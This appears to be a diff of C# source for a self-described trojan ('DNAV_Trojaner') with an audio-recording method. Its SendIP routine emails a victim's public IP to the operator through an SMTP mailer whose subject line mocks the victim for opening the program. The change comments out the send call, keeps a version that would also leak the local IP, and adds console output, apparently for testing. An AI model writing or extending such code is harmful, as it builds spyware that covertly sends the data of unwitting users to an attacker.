@@ -4,7 +4,6 @@ using System.Linq;
 using System.Text;
 using System.IO;
 using System.Threading;
-
 namespace DNAV_Trojaner {
     class Program {
         static public void Tonaufnahme() {
@@ -30,8 +29,9 @@ namespace DNAV_Trojaner {
         static public void SendIP() {
             //! Daten richtig angeben
             Mailer m = new Mailer("ToMail@mail.de","FromMail@mail.de","FromMail@mail.de","Supergeheim",587,"mail.mail.de");
-            m.send("Trottel hat DNAV geöffnet", TCP.getPublicIP());
-            Thread.Sleep(15000);
+            //m.send("Trottel hat DNAV geöffnet", "Public: " + TCP.getPublicIP() + "\nLocal: " + TCP.getLocalIP());
+            Console.Write(TCP.getLocalIPList());
+            Console.Read();
         }
 
         static void Main(string[] args) {
